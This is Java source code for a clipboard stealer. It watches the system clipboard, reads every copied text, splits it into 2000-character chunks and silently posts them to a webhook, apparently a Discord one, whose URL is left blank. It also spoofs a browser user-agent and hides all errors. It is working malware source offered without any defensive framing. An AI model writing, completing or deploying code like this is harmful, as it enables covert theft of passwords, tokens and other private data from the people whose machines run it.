package apple26j;

import javax.net.ssl.HttpsURLConnection;
import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.FlavorEvent;
import java.awt.datatransfer.FlavorListener;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLEncoder;

public class Main
{
    /*
     * The WebHook
     */
    public static final String webHook = "";

    private static final Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();

    public static void main(String[] arguments)
    {
        clipboard.addFlavorListener(flavorEvent ->
        {
            try
            {
                String clipboard = (String) Main.clipboard.getData(DataFlavor.stringFlavor);

                if (clipboard.length() > 2000)
                {
                    String[] chunks = clipboard.split("(?s)(?<=\\G.{2000})");;

                    for (String chunk : chunks)
                    {
                        sendMessage(chunk);
                    }
                }

                else
                {
                    sendMessage(clipboard);
                }
            }

            catch (Exception e)
            {
                ;
            }
        });

        try
        {
            Thread.sleep(2147483648L);
        }

        catch (Exception e)
        {
            ;
        }
    }

    public static void sendMessage(String message)
    {
        try
        {
            HttpsURLConnection httpsURLConnection = ((HttpsURLConnection) (new URL(webHook)).openConnection());
            httpsURLConnection.setRequestProperty("accept", "*/*");
            httpsURLConnection.setRequestProperty("connection", "Keep-Alive");
            httpsURLConnection.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            httpsURLConnection.setDoOutput(true);
            httpsURLConnection.setDoInput(true);
            PrintWriter printWriter = new PrintWriter(httpsURLConnection.getOutputStream());
            String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8");
            printWriter.print(postData);
            printWriter.flush();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpsURLConnection.getInputStream()));

            while (bufferedReader.readLine() != null)
            {
                ;
            }

            bufferedReader.close();
            printWriter.close();
        }

        catch (Exception e)
        {
            ;
        }
    }
}
